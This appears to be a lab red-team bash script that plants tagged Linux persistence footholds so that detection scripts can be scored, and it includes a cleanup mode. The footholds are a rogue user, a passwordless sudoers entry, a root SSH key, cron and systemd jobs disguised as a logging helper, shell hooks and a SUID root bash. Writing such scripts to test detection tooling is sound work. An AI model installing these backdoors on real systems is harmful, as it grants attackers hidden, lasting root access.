#!/usr/bin/env bash
# Red-team simulation for the LAB ONLY. Plants a spread of realistic persistence
# and access footholds so hunt.sh and recon.sh can be scored against ground
# truth. Every technique here is a standard CCDC red-team move; nothing is novel
# or weaponized. Run only on a disposable VM you own.
#
#   sudo ./plant.sh          plant everything, print the ground-truth list
#   sudo ./plant.sh --clean  remove everything it planted
set -u
MARK="RT_LAB_PLANT"   # every artifact is tagged so cleanup is exact
manifest=/root/.rt_manifest

plant() { printf '  planted: %s\n' "$1"; printf '%s\n' "$1" >>"$manifest"; }

if [ "${1:-}" = "--clean" ]; then
  echo "[*] removing lab plants"
  systemctl disable --now rt-backdoor.timer >/dev/null 2>&1 || true
  rm -f /etc/systemd/system/rt-backdoor.service /etc/systemd/system/rt-backdoor.timer
  systemctl daemon-reload
  crontab -l 2>/dev/null | grep -v "$MARK" | crontab - 2>/dev/null || true
  rm -f /etc/cron.d/rt-cron /etc/profile.d/rt-profile.sh
  sed -i "/$MARK/d" /root/.bashrc 2>/dev/null || true
  userdel -r rtsvc 2>/dev/null || true
  sed -i "/$MARK/d" /etc/sudoers 2>/dev/null || true
  rm -f /usr/local/bin/rt-implant /tmp/.rt-listener /dev/shm/.rt
  # restore an SUID bash if we made one
  rm -f /usr/local/bin/rootbash
  # remove the extra authorized_key
  [ -f /root/.ssh/authorized_keys ] && sed -i "/$MARK/d" /root/.ssh/authorized_keys
  rm -f "$manifest"
  echo "[*] done"
  exit 0
fi

[ "$(id -u)" -eq 0 ] || { echo "run as root on a lab VM"; exit 1; }
: >"$manifest"
echo "[*] planting lab persistence (all tagged $MARK)"

# 1. Rogue local user with a password and a real shell.
useradd -m -s /bin/bash rtsvc 2>/dev/null && echo 'rtsvc:Sup3rSecret!' | chpasswd
plant "user:rtsvc (uid $(id -u rtsvc 2>/dev/null))"

# 2. Sudoers backdoor - passwordless root for the rogue user.
echo "rtsvc ALL=(ALL) NOPASSWD:ALL # $MARK" >>/etc/sudoers
plant "sudoers:rtsvc NOPASSWD:ALL"

# 3. Extra root SSH key (survives a password change - the classic).
mkdir -p /root/.ssh; chmod 700 /root/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILABPLANTdummykeyforhuntdetection $MARK" >>/root/.ssh/authorized_keys
plant "ssh-key:/root/.ssh/authorized_keys (+1 attacker key)"

# 4. Cron persistence (system cron.d).
echo "*/5 * * * * root /usr/local/bin/rt-implant # $MARK" >/etc/cron.d/rt-cron
plant "cron:/etc/cron.d/rt-cron"

# 5. Root crontab entry.
( crontab -l 2>/dev/null; echo "*/10 * * * * /usr/local/bin/rt-implant # $MARK" ) | crontab -
plant "cron:root crontab"

# 6. systemd service + timer (the modern persistence).
cat >/etc/systemd/system/rt-backdoor.service <<UNIT
[Unit]
Description=System Logging Helper
[Service]
ExecStart=/usr/local/bin/rt-implant
UNIT
cat >/etc/systemd/system/rt-backdoor.timer <<UNIT
[Unit]
Description=System Logging Helper Timer
[Timer]
OnBootSec=60
OnUnitActiveSec=300
[Install]
WantedBy=timers.target
UNIT
systemctl daemon-reload; systemctl enable --now rt-backdoor.timer >/dev/null 2>&1
plant "systemd:rt-backdoor.timer (disguised as 'System Logging Helper')"

# 7. The implant itself + shell-profile persistence.
cat >/usr/local/bin/rt-implant <<'IMP'
#!/bin/sh
# lab implant: harmless beacon stand-in
:
IMP
chmod +x /usr/local/bin/rt-implant
plant "binary:/usr/local/bin/rt-implant"
echo "# $MARK" >/etc/profile.d/rt-profile.sh
echo "true # lab implant profile hook" >>/etc/profile.d/rt-profile.sh
plant "profile.d:/etc/profile.d/rt-profile.sh"
echo "# $MARK lab bashrc hook" >>/root/.bashrc
plant "bashrc:/root/.bashrc hook"

# 8. SUID root shell - privilege-escalation foothold.
cp /bin/bash /usr/local/bin/rootbash && chmod 4755 /usr/local/bin/rootbash
plant "suid:/usr/local/bin/rootbash (SUID root shell)"

# 9. Process running from /dev/shm (fileless-ish).
cp /usr/local/bin/rt-implant /dev/shm/.rt 2>/dev/null && chmod +x /dev/shm/.rt
plant "tmpfile:/dev/shm/.rt"

echo
echo "[*] GROUND TRUTH - $(wc -l <"$manifest") artifacts planted:"
cat "$manifest"
